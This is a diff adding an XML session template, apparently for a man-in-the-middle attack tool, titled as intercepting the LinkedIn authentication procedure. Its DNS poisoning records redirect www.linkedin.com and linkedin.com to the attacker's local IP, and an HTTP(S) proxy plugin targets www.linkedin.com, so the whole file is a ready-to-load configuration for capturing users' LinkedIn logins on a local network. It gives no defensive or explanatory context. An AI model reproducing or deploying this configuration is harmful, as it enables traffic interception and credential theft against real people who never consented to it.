@@ -1,0 +1,33 @@
+	<SessionTemplate>
+<Config name="authentication_linkedin" description="Intercepting Linkedin authentication procedure">
+</Config>
+
+<Plugins>
+<Plugin name="DNS Poisoning" dirname="DNSPoisoning">
+
+<ArrayOfDNSPoisonRecord xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <DNSPoisonRecord>
+    <HostName>www.linkedin.com</HostName>
+    <IPAddress>@LOCALIP</IPAddress>
+  </DNSPoisonRecord>
+  <DNSPoisonRecord>
+    <HostName>linkedin.com</HostName>
+    <IPAddress>@LOCALIP</IPAddress>
+  </DNSPoisonRecord>  
+</ArrayOfDNSPoisonRecord>
+</Plugin>
+
+
+<Plugin name="HTTP(S) proxy" dirname="HTTPProxy">
+
+<PluginData xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <RemoteHost>www.linkedin.com</RemoteHost>
+  <RedirectURL />
+  <Records />
+</PluginData>
+</Plugin>
+
+
+</Plugins>
+
+</SessionTemplate>
